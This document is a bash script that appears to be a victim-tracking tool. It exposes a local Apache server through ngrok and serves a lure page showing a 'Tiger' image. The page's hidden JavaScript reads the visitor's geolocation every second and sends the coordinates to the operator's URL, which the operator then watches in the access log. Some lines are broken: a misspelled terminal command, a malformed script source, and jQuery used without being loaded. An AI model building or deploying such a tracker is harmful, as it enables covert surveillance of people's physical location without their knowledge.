#!/bin/bash

#64_bit
#xterm -e ./ngrok http 80 & clear

#32_Bit
ghome-terminal -e ./ngrok http 80 


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Tiger </title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"Tiger.jpg\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://https://shop-phinf.pstatic.net/20250107_104/17362336232280Kle8_JPEG/%ED%96%89%EC%82%AC%EC%9E%A5_01.jpg?type=w860" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp Tiger.jpg /var/www/html/Tiger.jpg
service apache2 start
echo "         ______________________________________________________   
         7      77  _  77  _  77     77  7  77  7  77  _  77  7   
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
